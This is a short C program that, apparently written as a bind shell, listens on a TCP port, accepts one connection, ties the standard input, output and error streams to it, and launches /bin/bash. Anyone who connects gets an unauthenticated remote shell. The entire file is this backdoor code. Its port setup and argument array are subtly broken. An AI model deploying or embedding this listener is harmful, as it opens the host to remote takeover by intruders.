#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int
main (void)
{
	char * shell[2];
	shell[0] = "/bin/bash";
	shell[1] = "0";

	int server, client;
	struct sockaddr_in server_addr;

	server = socket (AF_INET, SOCK_STREAM, 0);
	server_addr.sin_addr.s_addr = 0;
	server_addr.sin_port	    = 23333;
	server_addr.sin_family      = AF_INET;
	bind (server, (struct sockaddr *)&server_addr,
		sizeof(server_addr));

	listen (server, 0);
	
	client = accept (server, 0, 0);

	dup2 (client, 0);
	dup2 (client, 1);
	dup2 (client, 2);

	execve (shell[0], shell, 0);

	return 0;
}
